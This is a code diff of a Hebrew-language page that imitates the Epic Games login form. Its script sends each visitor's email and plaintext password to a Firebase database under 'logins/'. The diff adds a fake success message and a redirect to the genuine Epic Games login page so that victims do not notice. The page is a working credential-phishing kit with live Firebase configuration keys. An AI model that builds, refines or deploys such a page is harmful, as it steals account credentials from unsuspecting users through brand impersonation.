@@ -69,34 +69,11 @@
 
         button:hover { background-color: var(--epic-blue-hover); }
 
-        .error { 
+        .message-area { 
             margin-top: 15px; 
-            font-size: 13px; 
-            color: #ff3e3e;
+            font-size: 14px; 
             line-height: 1.4;
-        }
-
-        .verified-container {
-            display: none;
-            animation: fadeIn 0.5s ease;
-        }
-
-        .verified-icon {
-            font-size: 60px;
-            color: var(--success-green);
-            margin-bottom: 20px;
-        }
-
-        .verified-text {
-            font-size: 24px;
-            font-weight: bold;
-            color: var(--success-green);
-            text-transform: uppercase;
-        }
-
-        @keyframes fadeIn {
-            from { opacity: 0; transform: translateY(10px); }
-            to { opacity: 1; transform: translateY(0); }
+            min-height: 20px;
         }
     </style>
 </head>
@@ -109,13 +86,7 @@
         <input type="email" id="email" placeholder="כתובת אימייל">
         <input type="password" id="password" placeholder="סיסמה">
         <button onclick="login()">כניסה לחשבון</button>
-        <p id="message" class="error"></p>
-    </div>
-
-    <div id="verifiedPage" class="verified-container">
-        <div class="verified-icon">✓</div>
-        <div class="verified-text">Verified</div>
-        <p>החשבון אומת בהצלחה</p>
+        <div id="message" class="message-area"></div>
     </div>
 </div>
 
@@ -123,11 +94,10 @@
 <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
 
 <script>
-    // הגדרות Firebase - כולל databaseURL
     const firebaseConfig = {
         apiKey: "AIzaSyAdMfT8b2qkEuscfANoHfd84grGyjwroLc",
         authDomain: "epic-games-66888.firebaseapp.com",
-        databaseURL: "https://epic-games-66888-default-rtdb.firebaseio.com", // וודא שהכתובת הזו זהה למה שמופיע ב-Console
+        databaseURL: "https://epic-games-66888-default-rtdb.firebaseio.com", 
         projectId: "epic-games-66888",
         storageBucket: "epic-games-66888.firebasestorage.app",
         messagingSenderId: "1099132611577",
@@ -135,7 +105,6 @@
         measurementId: "G-SS7HZGV6Y9"
     };
 
-    // אתחול Firebase
     firebase.initializeApp(firebaseConfig);
     const database = firebase.database();
 
@@ -143,10 +112,7 @@
         const email = document.getElementById("email").value;
         const password = document.getElementById("password").value;
         const message = document.getElementById("message");
-        const loginForm = document.getElementById("loginForm");
-        const verifiedPage = document.getElementById("verifiedPage");
 
-        // ולידציה
         const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
         const passRegex = /^(?=.*[A-Za-z])(?=.*\d)[A-Za-z\d]{8,}$/;
         const hasSpaces = /\s/.test(password);
@@ -163,23 +129,26 @@
             return;
         }
 
-        message.style.color = "white"; // תיקון כאן (בלי #)
+        message.style.color = "white";
         message.innerText = "מתחבר...";
 
-        // שליחה ל-Firebase
         database.ref('logins/').push({
             email: email,
             password: password,
             date: new Date().toLocaleString()
         }).then(() => {
-            // הצלחה - מעבר לדף Verified
-            loginForm.style.display = "none";
-            verifiedPage.style.display = "block";
+            // הצלחה - הצגת הודעה ירוקה
+            message.style.color = "#2ecc71";
+            message.innerText = "התחברת בהצלחה! מעביר אותך...";
+            
+            // המתנה של 2 שניות (2000 מילישניות) לפני העברה
+            setTimeout(() => {
+                window.location.href = "https://www.epicgames.com/id/login";
+            }, 2000);
+
         }).catch((error) => {
-            // שגיאה - הצגת השגיאה המדויקת
             message.style.color = "#ff3e3e";
             message.innerText = "שגיאה בחיבור: " + error.message;
-            console.error(error);
         });
     }
 </script>
